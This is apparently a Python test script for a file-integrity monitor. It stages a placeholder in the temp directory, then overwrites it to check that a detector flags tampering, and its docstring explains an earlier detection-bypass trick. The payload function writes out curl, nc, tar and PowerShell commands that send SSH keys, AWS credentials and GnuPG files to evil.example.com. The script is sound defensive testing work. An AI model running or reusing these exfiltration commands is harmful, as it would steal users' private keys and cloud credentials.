#!/usr/bin/env python3
"""
Trigger file_system_tampering detection via temp-file modify (staged-payload
bypass).

Historical evasion vector: the ``file_system_tampering`` check used to only
look at ``create`` and ``rename`` FIM events for files in temp directories.
A ``modify`` event on a pre-existing temp file was ignored, letting attackers
drop a benign placeholder early and overwrite it later with a malicious
payload without producing a finding.

Closure mechanism (edamame_foundation + edamame_core):

  1. FIM default watch paths now cover the platform temp roots (``/tmp``,
     ``/var/tmp``, ``TMPDIR`` / ``%TEMP%`` / ``%TMP%``) in both standalone
     and helper modes (``flodbadd::fim::default_temp_watch_paths``).
  2. The vulnerability detector pre-enriches temp FIM events with
     content-scan signals produced by
     ``edamame_foundation::secret_content_scan::scan_secret_like_files``.
  3. Signals that are ``script_like`` or ``network_command_like`` produce a
     ``file_system_tampering`` finding even when ``secret_hits`` is zero,
     which covers shell / curl / nc droppers written into ``/tmp``.

Attack pattern (reproduced safely by this trigger):

  Phase 1 -- Create a benign-looking placeholder in the temp directory.
  Phase 2 -- Overwrite with a multi-line payload that contains curl / nc /
             tar commands referencing credential paths, so the content scan
             classifies the modified file as ``script_like`` +
             ``network_command_like``.

Detection path:
  FIM watcher (modify event in temp root)
    -> content scan -> script_like / network_command_like
    -> file_system_tampering (HIGH: "Suspicious temp file modify detected")

Cross-platform: macOS, Linux, Windows (uses ``tempfile.gettempdir()``; the
payload written on Windows omits the POSIX-only chmod / shebang, but the
content still classifies as network_command_like because of the curl/nc
tokens).
"""

from __future__ import annotations

import argparse
import os
import platform
import signal
import stat
import sys
import tempfile
import time
from pathlib import Path

from _common import (
    AGENT_TYPE_ARG_HELP,
    file_prefix_for,
    resolve_agent_type,
    state_dir_for,
)

PID_FILE = "temp_modify.pid"
CREATED_MARKER = "temp_modify.created"

KEEP_RUNNING = True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Trigger file_system_tampering on a temp-file modify event "
                    "by overwriting a benign placeholder with a script-like payload."
    )
    p.add_argument("--duration", type=float, default=120.0,
                   help="Runtime limit in seconds; 0 = until interrupted")
    p.add_argument("--phase1-wait", type=float, default=5.0,
                   help="Seconds between the placeholder create and the modify")
    p.add_argument("--remodify-interval", type=float, default=30.0,
                   help="Seconds between subsequent modify cycles (keeps FIM warm)")
    p.add_argument("--agent-type", default=None, help=AGENT_TYPE_ARG_HELP)
    p.add_argument("--state-dir", type=Path, default=None)
    return p.parse_args()


def handle_signal(signum: int, _frame: object) -> None:
    global KEEP_RUNNING
    _ = signum
    KEEP_RUNNING = False


def ensure_state_dir(d: Path) -> None:
    d.mkdir(parents=True, exist_ok=True)


def record_created(state_dir: Path, path: Path) -> None:
    marker = state_dir / CREATED_MARKER
    existing = set()
    if marker.exists():
        existing = {
            line.strip()
            for line in marker.read_text("utf-8").splitlines()
            if line.strip()
        }
    existing.add(str(path))
    marker.write_text("\n".join(sorted(existing)) + "\n", encoding="utf-8")


def chmod_executable(path: Path) -> None:
    if platform.system() == "Windows":
        return
    try:
        path.chmod(path.stat().st_mode | stat.S_IXUSR)
    except OSError:
        pass


def write_placeholder(path: Path) -> None:
    if platform.system() == "Windows":
        path.write_text("REM benign placeholder\r\necho benign\r\n",
                        encoding="utf-8")
    else:
        path.write_text("#!/bin/sh\necho 'benign placeholder'\n",
                        encoding="utf-8")
    chmod_executable(path)


def build_malicious_payload(round_num: int) -> str:
    # Content must trigger the secret-content scanner's network_command_like
    # and/or script_like heuristics.  curl / nc / tar + shell shebang are
    # enough; we also sprinkle credential path references so the staged
    # script is clearly exfil-shaped.
    if platform.system() == "Windows":
        return (
            "@echo off\r\n"
            f"REM staged modify round {round_num}\r\n"
            "powershell -Command \"Invoke-WebRequest "
            "-Uri http://evil.example.com/exfil "
            "-InFile $HOME\\.ssh\\id_rsa -Method POST\"\r\n"
            "type %USERPROFILE%\\.aws\\credentials | "
            "powershell -Command \"$input | Out-File -Encoding ascii drop.txt\"\r\n"
        )
    return (
        "#!/bin/sh\n"
        f"# staged modify round {round_num}\n"
        "curl -s http://evil.example.com/exfil -d @~/.ssh/id_rsa\n"
        "cat ~/.aws/credentials | nc evil.example.com 4444\n"
        "tar czf /tmp/.cache_dump.tgz ~/.gnupg/ && "
        "curl -X POST http://evil.example.com/drop "
        "-F 'f=@/tmp/.cache_dump.tgz'\n"
    )


def write_malicious(path: Path, round_num: int) -> int:
    payload = build_malicious_payload(round_num)
    path.write_text(payload, encoding="utf-8")
    chmod_executable(path)
    return len(payload)


def temp_target_path(pfx: str) -> Path:
    return Path(tempfile.gettempdir()) / f"{pfx}_temp_staged_binary"


def main() -> int:
    args = parse_args()
    agent_type = resolve_agent_type(args.agent_type)
    if args.state_dir is None:
        args.state_dir = state_dir_for(agent_type)
    state_dir = args.state_dir
    ensure_state_dir(state_dir)

    pfx = file_prefix_for(agent_type)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    pid_file = state_dir / PID_FILE
    pid_file.write_text(f"{os.getpid()}\n", encoding="utf-8")

    target = temp_target_path(pfx)
    # Remove any stale copy so the placeholder write generates a real Create
    # event rather than a no-op.
    try:
        target.unlink()
    except FileNotFoundError:
        pass

    print(f"trigger_temp_modify.py active  pid={os.getpid()}")
    print(f"  target={target}")
    print(f"  phase1_wait={args.phase1_wait}s")
    print(f"  duration={args.duration}s")
    print("  check=file_system_tampering")
    print("  stop_with=Ctrl-C or python3 cleanup.py")
    sys.stdout.flush()

    print("  Phase 1: creating benign placeholder")
    write_placeholder(target)
    record_created(state_dir, target)
    print(f"  Phase 1 done: created {target} (Create FIM event)")
    sys.stdout.flush()

    phase1_wait = max(args.phase1_wait, 0.0)
    if phase1_wait > 0:
        print(f"  Waiting {phase1_wait:.1f}s before first modify...")
        end_wait = time.monotonic() + phase1_wait
        while KEEP_RUNNING and time.monotonic() < end_wait:
            time.sleep(min(0.5, phase1_wait))

    if not KEEP_RUNNING:
        _cleanup_pid_file(pid_file)
        return 0

    round_num = 0
    print("  Phase 2: overwriting placeholder with script-like payload (Modify event)")
    round_num += 1
    size = write_malicious(target, round_num)
    print(f"  Phase 2 done: overwrote {target} with payload ({size}B, round={round_num})")
    print("  The modify event should now trigger file_system_tampering "
          "via content-scan (script_like / network_command_like)")
    sys.stdout.flush()

    started = time.monotonic()
    duration = max(args.duration, 0.0)
    interval = max(args.remodify_interval, 5.0)

    try:
        while KEEP_RUNNING:
            if duration > 0 and (time.monotonic() - started) >= duration:
                break

            end_sleep = time.monotonic() + interval
            while KEEP_RUNNING and time.monotonic() < end_sleep:
                time.sleep(min(1.0, interval))

            if not KEEP_RUNNING:
                break

            round_num += 1
            size = write_malicious(target, round_num)
            print(f"  re-modified {target} round={round_num} size={size}B")
            sys.stdout.flush()
    finally:
        _cleanup_pid_file(pid_file)

    return 0


def _cleanup_pid_file(pid_file: Path) -> None:
    try:
        pid_file.unlink()
    except FileNotFoundError:
        pass


if __name__ == "__main__":
    raise SystemExit(main())
